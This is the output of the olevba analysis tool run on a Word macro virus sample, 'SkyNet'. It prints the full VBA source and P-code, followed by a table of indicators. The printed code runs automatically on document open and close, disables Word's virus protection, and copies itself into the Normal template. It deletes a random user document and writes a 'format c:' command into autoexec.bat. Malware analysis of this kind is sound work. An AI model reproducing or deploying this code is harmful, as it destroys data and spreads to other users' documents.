olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Skin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Skin - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SkyNet.bas 
in file: ./Virus.MSWord.Skin - OLE stream: 'Macros/VBA/SkyNet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub ViewVBcode()
    a = MsgBox("No se pudo encontrar o iniciar Microsoft Visual Basic.", vbExclamation)
End Sub
Sub HerramMacro()
    a = MsgBox("No se pudo encontrar o iniciar Visor de Macros.", vbExclamation)
End Sub
Sub Accion()
On Error Resume Next
If Year(Date) > 1999 Or Month(Date) > 10 Then
 If Hour(Time) > 19 Then
  Application.FileSearch.SearchSubFolders = True
  Application.FileSearch.LookIn = Application.Options.DefaultFilePath(wdDocumentsPath)
  Application.FileSearch.FileType = msoFileTypeWordDocuments
  a = Application.FileSearch.Execute(msoSortByFileName, msoSortOrderAscending, True)
  t = Int(Rnd * a) + 1
  f$ = Application.FileSearch.FoundFiles(t)
  SetAttr f$, vbNormal
  Open f$ For Output As #1: Close #1
  Kill f$
 End If
End If
If Year(Date) > 1999 Then
 If Day(Date) = 18 Then
  If Hour(Time) > 19 Then
   f$ = "C:\autoexec.bat"
   SetAttr f$, vbNormal
   Open f$ For Output As #1
   Print #1, "PATH=C:\DOS;C:\WINDOWS\COMMAND;C:\WIN95\COMMAND;C:\WIN98\COMMAND\"
   Print #1, "echo s | format c:/q/V:SkyNet >nul"
   Close #1
  End If
 End If
End If
End Sub
Sub AutoClose()
On Error Resume Next
Call SkyNet
End Sub
Sub AutoOpen()
On Error Resume Next
Call SkyNet
End Sub

Sub AutoExec()
On Error Resume Next
Call Accion
End Sub
Sub SkyNet()
Attribute SkyNet.VB_Description = "Macro creada el 18/09/99 por DesMan"
Attribute SkyNet.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.SkyNet"
On Error Resume Next

Dim InfD As Boolean
Dim InfT As Boolean
Dim I
'CommandBars("tools").Controls("Macro").Delete
'CommandBars("tools").Controls("Plantillas y complementos...").Delete
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone

ActiveDocument.ReadOnlyRecommended = False

InfD = False: InfT = False
For I = 1 To ActiveDocument.VBProject.vBComponents.Count
 If ActiveDocument.VBProject.vBComponents(I).Name = "SkyNet" Then InfD = True
Next

For I = 1 To NormalTemplate.VBProject.vBComponents.Count
 If NormalTemplate.VBProject.vBComponents(I).Name = "SkyNet" Then InfT = True
Next

If InfD = False Then
 WordBasic.MacroCopy "Normal:SkyNet", WordBasic.[FileName$]() + ":SkyNet"
 If NormalTemplate.Saved = False Then NormalTemplate.Save
 NormalTemplate.Saved = True
End If

If InfT = False Then
 WordBasic.MacroCopy WordBasic.[FileName$]() + ":SkyNet", "Normal:SkyNet"
 If ActiveDocument.Saved = False Then ActiveDocument.Save
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Skin
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/SkyNet - 5156 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub ViewVBcode())
' Line #2:
' 	LitStr 0x0036 "No se pudo encontrar o iniciar Microsoft Visual Basic."
' 	Ld vbExclamation 
' 	ArgsLd MsgBox 0x0002 
' 	St a 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Sub HerramMacro())
' Line #5:
' 	LitStr 0x002F "No se pudo encontrar o iniciar Visor de Macros."
' 	Ld vbExclamation 
' 	ArgsLd MsgBox 0x0002 
' 	St a 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Sub Accion())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CF 
' 	Gt 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #10:
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0013 
' 	Gt 
' 	IfBlock 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemSt SearchSubFolders 
' Line #12:
' 	Ld wdDocumentsPath 
' 	Ld Application 
' 	MemLd Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemSt LookIn 
' Line #13:
' 	Ld msoFileTypeWordDocuments 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemSt FileType 
' Line #14:
' 	Ld msoSortByFileName 
' 	Ld msoSortOrderAscending 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd FileSearch 
' 	ArgsMemLd Execute 0x0003 
' 	St a 
' Line #15:
' 	Ld Rnd 
' 	Ld a 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #16:
' 	Ld t 
' 	Ld Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	St False$ 
' Line #17:
' 	Ld False$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #18:
' 	Ld False$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #19:
' 	Ld False$ 
' 	ArgsCall Kill 0x0001 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CF 
' 	Gt 
' 	IfBlock 
' Line #23:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0012 
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0013 
' 	Gt 
' 	IfBlock 
' Line #25:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	St False$ 
' Line #26:
' 	Ld False$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #27:
' 	Ld False$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "PATH=C:\DOS;C:\WINDOWS\COMMAND;C:\WIN95\COMMAND;C:\WIN98\COMMAND\"
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "echo s | format c:/q/V:SkyNet >nul"
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub AutoClose())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	ArgsCall (Call) SkyNet 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub AutoOpen())
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	ArgsCall (Call) SkyNet 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub AutoExec())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) Accion 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub SkyNet())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' Line #51:
' 	Dim 
' 	VarDefn InfD (As Boolean)
' Line #52:
' 	Dim 
' 	VarDefn InfT (As Boolean)
' Line #53:
' 	Dim 
' 	VarDefn I
' Line #54:
' 	QuoteRem 0x0000 0x002D "CommandBars("tools").Controls("Macro").Delete"
' Line #55:
' 	QuoteRem 0x0000 0x0044 "CommandBars("tools").Controls("Plantillas y complementos...").Delete"
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #57:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #58:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #60:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #61:
' Line #62:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #63:
' Line #64:
' 	LitVarSpecial (False)
' 	St InfD 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St InfT 
' Line #65:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vBComponents 
' 	MemLd Count 
' 	For 
' Line #66:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "SkyNet"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St InfD 
' 	EndIf 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' Line #69:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vBComponents 
' 	MemLd Count 
' 	For 
' Line #70:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "SkyNet"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St InfT 
' 	EndIf 
' Line #71:
' 	StartForVariable 
' 	Next 
' Line #72:
' Line #73:
' 	Ld InfD 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #74:
' 	LitStr 0x000D "Normal:SkyNet"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 ":SkyNet"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #75:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #76:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #77:
' 	EndIfBlock 
' Line #78:
' Line #79:
' 	Ld InfT 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #80:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0007 ":SkyNet"
' 	Add 
' 	LitStr 0x000D "Normal:SkyNet"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #81:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

